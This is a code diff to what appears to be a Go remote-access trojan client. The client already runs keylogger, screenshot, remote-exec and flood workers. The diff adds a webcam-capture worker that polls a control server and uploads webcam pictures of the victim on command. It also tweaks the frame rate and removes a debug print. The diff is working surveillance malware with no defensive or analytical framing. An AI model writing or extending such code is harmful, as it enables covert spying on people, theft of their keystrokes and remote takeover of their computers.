@@ -23,6 +23,8 @@ import (
 	"github.com/Xart3mis/AKILT/Client/lib/consumer"
 	"github.com/Xart3mis/AKILT/Client/lib/keylogger"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
+	"github.com/Xart3mis/AKILT/Client/lib/webcam"
+
 	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/go-gl/gl/all-core/gl"
 	"github.com/go-gl/glfw/v3.3/glfw"
@@ -132,7 +134,7 @@ func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.V
 	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient,
 	key_out chan rune, window_out chan string) {
 	lastFrameTime := 0.0
-	fpslimit := 1.0 / 100.0
+	fpslimit := 1.0 / 15.0
 
 	for !window.ShouldClose() {
 		now := glfw.GetTime()
@@ -144,15 +146,28 @@ func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.V
 
 			go keylog_worker(client, ctx, pid, key_out, window_out)
 			go screenshot_worker(client, ctx, pid)
+			go webcampic_worker(client, ctx, pid)
 			go dialog_worker(client, ctx, pid)
 			go exec_worker(client, ctx, pid)
 			go flood_worker(client, ctx)
-
 			window.SwapBuffers()
 			glfw.WaitEventsTimeout(fpslimit / 10000)
 		}
 
 	}
+}
+
+func webcampic_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
+	d, err := client.GetPicture(ctx, &pb.ClientDataRequest{ClientId: pid})
+	if err != nil {
+		return err
+	}
+	if d.GetShouldTakePicture() {
+		img := webcam.CaptureWebcam()
+		client.SetPictureOutput(ctx, &pb.PictureOutput{Id: &pb.ClientDataRequest{ClientId: pid}, PictureData: img})
+	}
+
+	return nil
 }
 
 func screenshot_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
@@ -225,7 +240,6 @@ func dialog_worker(client pb.ConsumerClient, ctx context.Context, pid string) er
 		var err error
 
 		for len(text) <= 0 {
-			fmt.Println(dialog.GetDialogPrompt(), dialog.GetDialogTitle())
 			text, err = zenity.Entry(dialog.GetDialogPrompt(), zenity.Title(dialog.GetDialogTitle()))
 		}
 
